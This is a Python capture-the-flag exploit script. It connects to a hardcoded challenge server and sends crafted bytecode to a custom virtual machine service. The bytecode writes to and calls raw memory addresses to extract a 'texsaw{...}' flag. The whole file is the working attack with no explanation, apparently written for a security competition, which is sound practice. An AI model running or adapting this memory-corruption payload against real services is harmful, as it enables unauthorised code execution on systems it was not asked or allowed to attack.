#!/usr/bin/env python3
import re
import socket


HOST = "143.198.163.4"
PORT = 1901


def build_payload() -> bytes:
    asm = "\n".join(
        [
            "LOAD 0",
            "LOAD 33563137",
            "LOAD 0",
            "LOAD 33562972",
            "LOAD 4",
            "VECTOR",
            "LOAD 0",
            "LOAD 33562972",
            "VECTORSET",
            "LOAD 2",
            "LOAD 2",
            "ADD",
            "LOAD NULL",
            "CONS",
            "LOAD 0",
            "LOAD 0",
            "PRIMAPPLY 80087f1",
            "DONE",
        ]
    )
    return (asm + "\n").encode()


def main() -> None:
    payload = build_payload()
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(2)
        try:
            sock.recv(4096)
        except Exception:
            pass
        sock.sendall(payload)

        data = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except Exception:
                break
            if not chunk:
                break
            data += chunk

    m = re.search(rb"texsaw\{[^}\r\n]+\}", data)
    if m:
        print(m.group(0).decode())
    else:
        print(data.decode("latin1", "ignore"))


if __name__ == "__main__":
    main()
